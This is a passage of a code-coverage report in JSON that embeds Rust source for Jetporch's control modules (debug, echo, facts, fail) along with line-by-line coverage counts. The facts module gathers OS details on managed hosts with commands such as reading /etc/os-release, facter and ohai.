ngth":0,"stats":{"Line":0}}],"covered":3,"coverable":51},{"path":["/","Users","wings","projects","jetpack","src","modules","control","debug.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::handle::template::BlendTarget;\nuse serde::Deserialize;\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"debug\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct DebugTask {\n    pub name: Option\u003cString\u003e,\n    pub vars: Option\u003cVec\u003cString\u003e\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\n#[allow(dead_code)]\nstruct DebugAction {\n    pub name: String,\n    pub vars: Option\u003cVec\u003cString\u003e\u003e,\n}\n\nimpl IsTask for DebugTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(DebugAction {\n                    name: self.name.clone().unwrap_or(String::from(MODULE)),\n                    vars: self.vars.clone()\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nimpl IsAction for DebugAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                let mut map : serde_yaml::Mapping = serde_yaml::Mapping::new();\n                let no_vars = self.vars.is_none();\n                let blended = handle.run_state.context.read().unwrap().get_complete_blended_variables(\u0026handle.host, BlendTarget::NotTemplateModule);\n                for (k,v) in blended.iter() {\n                    let k2 : String = match k {\n                        serde_yaml::Value::String(s) =\u003e s.clone(),\n                        _ =\u003e { panic!(\"invalid key in mapping\"); }\n                    };\n                    if no_vars || self.vars.as_ref().unwrap().contains(\u0026k2) {\n                        if ! k2.eq(\u0026String::from(\"item\")) {\n                            map.insert(k.clone(), v.clone());\n                        }\n                    }\n                }\n                let msg = serde_yaml::to_string(\u0026map).unwrap();\n                let msg2 = format!(\"\\n{}\\n\", msg);\n                handle.debug(request, \u0026msg2);\n                return Ok(handle.response.is_passive(request));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n\n}","traces":[{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":2}},{"line":44,"address":[],"length":0,"stats":{"Line":1}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":29},{"path":["/","Users","wings","projects","jetpack","src","modules","control","echo.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse serde::Deserialize;\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"echo\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct EchoTask {\n    pub name: Option\u003cString\u003e,\n    pub msg: String,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\n#[allow(dead_code)]\nstruct EchoAction {\n    pub name: String,\n    pub msg: String,\n}\n\nimpl IsTask for EchoTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(EchoAction {\n                    name: self.name.clone().unwrap_or(String::from(MODULE)),\n                    msg:  handle.template.string_unsafe_for_shell(request, tm, \u0026String::from(\"msg\"), \u0026self.msg)?,\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nimpl IsAction for EchoAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                handle.debug(\u0026request, \u0026self.msg);\n                return Ok(handle.response.is_passive(request));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n\n}","traces":[{"line":41,"address":[],"length":0,"stats":{"Line":2}},{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":1}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":17},{"path":["/","Users","wings","projects","jetpack","src","modules","control","facts.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::inventory::hosts::{HostOSType};\nuse serde::Deserialize;\nuse std::sync::{Arc,RwLock};\n\nconst MODULE: \u0026str = \"facts\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct FactsTask {\n    pub name: Option\u003cString\u003e,\n    pub facter: Option\u003cString\u003e,\n    pub ohai: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\nstruct FactsAction {\n    facter: bool,\n    ohai: bool,\n}\n\nimpl IsTask for FactsTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(FactsAction {\n                    facter:  handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"facter\"), \u0026self.facter)?,\n                    ohai:    handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"ohai\"), \u0026self.ohai)?,\n\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nimpl IsAction for FactsAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                self.do_facts(handle, request)?;\n                return Ok(handle.response.is_passive(request));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n    }\n\n}\n\nimpl FactsAction {\n    \n    fn do_facts(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let os_type = handle.host.read().unwrap().os_type;\n        let facts = Arc::new(RwLock::new(serde_yaml::Mapping::new()));\n        match os_type {\n            Some(HostOSType::Linux)   =\u003e { self.do_linux_facts(handle, request, \u0026facts)?   },\n            Some(HostOSType::MacOS)   =\u003e { self.do_mac_facts(handle, request, \u0026facts)?     },\n            None =\u003e { return Err(handle.response.is_failed(request, \u0026String::from(\"facts not implemented for OS Type\"))) }\n        };\n        self.do_arch(handle, request, \u0026facts)?;\n        if self.facter {\n            self.do_facter(handle, request, \u0026facts)?;\n        }\n        if self.ohai {\n            self.do_ohai(handle, request, \u0026facts)?;\n\n        }\n        handle.host.write().unwrap().update_facts(\u0026facts);\n        return Ok(());\n    }\n\n    fn insert_string(\u0026self, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e, key: \u0026String, value: \u0026String) {\n        mapping.write().unwrap().insert(serde_yaml::Value::String(key.clone()), serde_yaml::Value::String(value.clone())); \n    }\n\n    fn insert_json(\u0026self, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e, key: \u0026String, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match serde_json::from_str(value) {\n            Ok(json) =\u003e { mapping.write().unwrap().insert(serde_yaml::Value::String(key.clone()), json); Ok(()) }\n            Err(y) =\u003e Err(format!(\"error processing fact JSON: {:?}\", y))\n        }\n    }\n\n    fn do_mac_facts(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        self.insert_string(mapping, \u0026String::from(\"jet_os_type\"), \u0026String::from(\"MacOS\"));\n        self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"OSX\"));\n        return Ok(());\n    }\n\n    fn do_linux_facts(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        self.insert_string(mapping, \u0026String::from(\"jet_os_type\"), \u0026String::from(\"Linux\"));\n        self.do_linux_os_release(handle, request, mapping)?;\n        return Ok(());\n    }\n\n    fn do_linux_os_release(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        // makes a lot of variables from everything in /etc/os-release with a jet_os_release prefix such as:\n        // jet_os_release_id=\"rocky\" \n        // jet_os_release_platform_id=\"platform:el9\"\n        // jet_os_release_id_like=\"rhel centos fedora\"\n        // not all keys are available on all platforms \n        // more facts will be added from other sources later, some may be conditional based on distro\n        let cmd = String::from(\"cat /etc/os-release\");\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        for line in out.lines() {\n            let mut tokens = line.split(\"=\");\n            let key = tokens.nth(0);\n            let value = tokens.nth(0);\n            if key.is_some() \u0026\u0026 value.is_some() {\n                let mut k1 = key.unwrap().trim().to_string();\n                k1.make_ascii_lowercase();\n                let v1 = value.unwrap().trim().to_string().replace(\"\\\"\",\"\");\n                self.insert_string(mapping, \u0026format!(\"jet_os_release_{}\", k1.to_string()), \u0026v1.clone());\n                if k1.eq(\"id_like\") {\n                    if v1.find(\"rhel\").is_some() {\n                        self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"EL\"));\n                    } else if v1.find(\"debian\").is_some() {\n                        self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"Debian\"))\n                    } else if v1.find(\"arch\").is_some() {\n                        self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"Arch\"))\n                    }\n                }\n                // if /etc/os-release does not have ID_LIKE line, like Archlinux\n                if k1.eq(\"id\") {\n                    if v1.find(\"arch\").is_some() {\n                        self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"Arch\"));\n                    }\n                }\n            }\n        }\n        // jet_os_flavor should always have a value to prevent errors from invalid templates\n        if ! mapping.read().unwrap().contains_key(\"jet_os_flavor\") {\n            self.insert_string(mapping, \u0026String::from(\"jet_os_flavor\"), \u0026String::from(\"Unknown\"))\n        }\n        return Ok(());\n    }\n\n    fn do_arch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let os_type = handle.host.read().unwrap().os_type.expect(\"os type\");\n        let cmd = match crate::tasks::cmd_library::get_arch_command(os_type) {\n            Ok(x) =\u003e x,\n            Err(_) =\u003e { return Err(handle.response.is_failed(request, \u0026format!(\"unable to determine arch command for {:?}\", os_type))) },\n        };\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        self.insert_string(mapping, \u0026String::from(\"jet_arch\"), \u0026String::from(out));\n        return Ok(());\n    }\n\n    fn do_facter(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let result = handle.remote.run(request, \u0026String::from(\"facter --json\"), CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        match self.insert_json(mapping, \u0026String::from(\"facter\"), \u0026String::from(out)) {\n            Ok(_) =\u003e {},\n            Err(_) =\u003e { return Err(handle.response.is_failed(request, \u0026String::from(\"failed to parse facter output\"))) }\n        }\n        return Ok(());    }\n\n    fn do_ohai(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, mapping: \u0026Arc\u003cRwLock\u003cserde_yaml::Mapping\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let result = handle.remote.run(request, \u0026String::from(\"ohai\"), CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        match self.insert_json(mapping, \u0026String::from(\"ohai\"), \u0026String::from(out)) {\n            Ok(_) =\u003e {},\n            Err(_) =\u003e { return Err(handle.response.is_failed(request, \u0026String::from(\"failed to parse ohai output\"))) }\n        }\n        return Ok(());\n    }\n\n}\n\n","traces":[{"line":41,"address":[],"length":0,"stats":{"Line":2}},{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":1}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":189,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":193,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":94},{"path":["/","Users","wings","projects","jetpack","src","modules","control","fail.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse serde::Deserialize;\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"fail\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct FailTask {\n    pub name: Option\u003cString\u003e,\n    pub msg: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\n#[allow(dead_code)]\nstruct FailAction {\n    pub name: String,\n    pub msg: Option\u003cString\u003e,\n}\n\nimpl IsTask for FailTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(FailAction {\n                    name: self.name.clone().unwrap_or(String::from(MODULE)),\n                    msg:  handle.template.string_option_unsafe_for_shell(request, tm, \u0026String::from(\"msg\"), \u0026self.msg)?,\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nimpl IsAction for FailAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                let msg = match self.msg.is_some() {\n                    true =\u003e self.msg.as_ref().unwrap().clone(),\n                    false =\u003e String::from(\"fail invoked\")\n                };\n                return Err(handle.response.is_failed(request, \u0026msg));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n\n}","traces":[{"line":41,"address":[],"length":0,"stats":{"Line":2}},{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":1}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":19},{"path":["/","Users","wings","projects","jetpack","src","modules","control","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod assert;\npub mod debug;\npub mod echo;\npub mod fail;\npub mod facts;\npub mod set;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","control","set.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse serde::{Deserialize};\nuse 